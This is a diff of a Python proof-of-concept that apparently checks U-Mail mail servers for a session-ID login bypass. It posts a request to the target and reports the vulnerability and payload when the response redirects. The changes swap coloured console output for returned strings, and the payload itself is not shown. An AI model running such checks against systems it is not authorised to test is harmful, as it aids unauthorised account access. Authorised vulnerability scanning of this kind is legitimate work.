@@ -9,8 +9,8 @@ description: 该邮件系统存在任意用户登录、且存在注入，从而�
 import sys
 import json
 import requests
-import warnings
-from termcolor import cprint
+
+
 
 class umail_sessionid_access_BaseVerify:
     def __init__(self, url):
@@ -29,12 +29,12 @@ class umail_sessionid_access_BaseVerify:
         try:
             req = requests.post(vulnurl, headers=headers, data=post_data, timeout=10, verify=False)
             if r'<meta http-equiv="refresh" content="0; URL=index.php">' in req.text:
-                cprint("[+]存在umail sessionid登录漏洞...(中危)\tpayload: "+vulnurl+"\npost: "+json.dumps(post_data, indent=4), "yellow") 
+                return "[+]存在umail sessionid登录漏洞...(中危)\tpayload: "+vulnurl+"\npost: "+json.dumps(post_data, indent=4) 
         except:
-            cprint("[-] "+__file__+"====>连接超时", "cyan")
+            return "[-]connect timeout"
 
 
 if __name__ == "__main__":
-    warnings.filterwarnings("ignore")
+
     testVuln = umail_sessionid_access_BaseVerify(sys.argv[1])
     testVuln.run()
